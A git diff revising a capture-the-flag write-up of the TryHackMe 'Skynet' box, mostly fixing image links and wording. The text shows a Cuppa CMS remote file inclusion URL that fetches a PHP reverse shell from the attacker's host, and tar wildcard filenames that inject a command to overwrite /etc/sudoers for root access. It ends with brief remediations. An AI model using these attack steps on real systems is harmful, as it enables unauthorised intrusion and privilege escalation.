@@ -98,7 +98,7 @@ Our Nmap scan reveals 5 ports are open:
 - 445 (Samba - smbd 4.3.11)
 
 For now let's skip SSH on port 22 and enumerate http on port 80 some more.
-![](INSERT HOMEPAGE)
+![](/assets/images/thm-skynet/homepage.png)
 
 
 All we have is search engine that does not send out any queries. Let's see if we can enumerate any directories on the webapp.
@@ -134,8 +134,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 **Dirsearch**
 ```
 python3 dirsearch.py -u http://10.10.156.86 -e *
-
-
+[...]
 [01:53:10] 301 -  312B  - /admin  ->  http://10.10.156.86/admin/                                     
 [01:53:14] 403 -  277B  - /admin/                       
 [01:53:14] 403 -  277B  - /admin/?/login         
@@ -150,6 +149,7 @@ python3 dirsearch.py -u http://10.10.156.86 -e *
 [01:54:06] 301 -  319B  - /squirrelmail  ->  http://10.10.156.86/squirrelmail/   
 ```
 Most directories seem to be forbidden except for `squirrelmail`. Upon visiting `squirrelmail` we are prompted with the following login page:
+
 ![](/assets/images/thm-skynet/squirrelmail.png)
 
 We don't have any creds at the moment, but we found an SMB server earlier. Let's enumerate the server and see if we can find any juicy info. Using `smbclient` we are able to view shares on the server.
@@ -315,15 +315,21 @@ Seems to be a Cuppa CMS installation running.
 
 ## Initial Access / User
 A `searchsploit` search reveals that Cuppa CMS has a [Local/Remote File Inclusion Vulnerability](https://www.exploit-db.com/exploits/25971) which we can exploit, to gain a reverse shell. 
+
 ![](/assets/images/thm-skynet/searchsploit.png)
 
-To set this up all we have to do is start a python server hosting in our directory that has our shell, then manipulate the `urlConfig` Parameter to point towards the PHP reverse shell. Once our reverse shell has been uploaded. Setup a netcat listener so we can gain a stable shell.
+To set this up all we have to do is start a simple python http server in the directory that has our shell, then manipulate the vulnerable `urlConfig` Parameter to point towards our PHP reverse shell code. Once our reverse shell has been uploaded. Setup a netcat listener so we can gain a stable shell.
+
+URL to execute RFI Vulnerability:
 ```
 http://10.10.156.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.6.12.92/shell.php?
 ```
+
+Let's check our python http server to see if we got a response.
 ![](/assets/images/thm-skynet/rfi.png)
 Now that we know our PHP code is on the machine, let's setup a listener and execute the script and gain a reverse shell.
 
+URL to execute LFI Vulnerability:
 ```
 http://10.10.156.86/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=shell.php
 ```
@@ -336,14 +342,16 @@ Now that we have a shell, let's grab the user flag.
 
 In Miles Dyson's home directory we notice a `backups` directory. Let's navigate there and check it out.
 ![](/assets/images/thm-skynet/backup.png)
+
 There is a `backup.sh` that seems to be executing a tar wildcard. After some research it turns out we can exploit a wildcard vulnerability in tar that wil allow us to gain a shell as root. To do this we must create three files in the `/var/www/html` directory. The first file will be our script called `privesc.sh`, the next two files will be names of arguments that tar will pass to execute our script.[Int0x33](https://twitter.com/int0x33) has a great post on [Abusing Wildcards for Tar Argument Injection](https://medium.com/@int0x33/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e). 
+
 ```
 $ echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
 $ echo "" > "--checkpoint-action=exec=sh privesc.sh"
 $ echo "" > --checkpoint=1
 ```
 Now if we run an `ls` command on the directory we will see our files in place, ready to run.
-![](/assets/images/thm-skynet/privesc1)
+![](/assets/images/thm-skynet/privesc1.png)
 
 `privesc.sh`
 
@@ -351,7 +359,8 @@ Now if we run an `ls` command on the directory we will see our files in place, r
 echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers
 ```
 
-Once all the files are in place. Execute the `backup.sh` and it will write to the sudoers file as the root user. Now our (www-data) user can execute a bash shell as root.
+Once all the files are in place. Execute the `backup.sh` script and it will write to the sudoers file with root SUID bit. Now our (www-data) user can execute a bash shell as root.
+
 ![](/assets/images/thm-skynet/root.png)
 
 ## Remediations
@@ -364,4 +373,4 @@ Once all the files are in place. Execute the `backup.sh` and it will write to th
 - Update CMS to latest version
 
 **Linux Server**
-- Don't use wildcard's Tar. 
+- Don't use wildcard's with Tar. 
